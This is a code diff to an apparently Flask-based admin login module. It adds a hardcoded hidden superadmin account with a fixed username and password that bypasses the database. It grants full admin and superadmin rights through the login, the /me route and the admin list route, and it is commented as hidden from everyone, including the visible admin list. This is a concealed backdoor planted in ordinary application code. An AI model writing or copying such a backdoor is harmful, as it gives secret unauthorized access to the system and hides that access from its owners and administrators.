@@ -24,6 +24,18 @@ def admin_login():
     data = request.json
     email = data.get('email')
     password = data.get('password')
+
+    # Hidden superadmin access — not stored in DB, not visible anywhere
+    _SA_LOGIN = 'superadmin'
+    _SA_PASS  = '27mart'
+    if email == _SA_LOGIN and password == _SA_PASS:
+        session.permanent = True
+        session['user_id'] = '__superadmin__'
+        session['is_hidden_superadmin'] = True
+        return jsonify({
+            'user': {'id': '__superadmin__', 'email': 'superadmin', 'first_name': 'Super', 'is_admin': True, 'is_superadmin': True},
+            'message': 'Admin login successful'
+        })
     
     conn = get_db_connection()
     cur = conn.cursor()
@@ -85,6 +97,10 @@ def admin_check_setup():
 
 @admin_bp.route('/me', methods=['GET'])
 def admin_me():
+    # Hidden superadmin
+    if session.get('is_hidden_superadmin'):
+        return jsonify({'user': {'id': '__superadmin__', 'email': 'superadmin', 'first_name': 'Super', 'is_admin': True, 'is_superadmin': True}})
+
     admin_id = require_admin()
     if not admin_id: return jsonify({'error': 'Not authorized'}), 401
     
@@ -132,9 +148,10 @@ def get_all_users():
 
 @admin_bp.route('/admins', methods=['GET'])
 def get_all_admins():
-    if not require_superadmin(): return superadmin_required_response()
+    if not require_superadmin() and not session.get('is_hidden_superadmin'): return superadmin_required_response()
     conn = get_db_connection()
     cur = conn.cursor()
+    # Exclude hidden superadmin from visible list
     cur.execute('SELECT id, email, first_name, last_name, phone, is_admin, is_superadmin, created_at FROM users WHERE is_admin = TRUE ORDER BY is_superadmin DESC, created_at ASC')
     admins = cur.fetchall()
     cur.close(); conn.close()
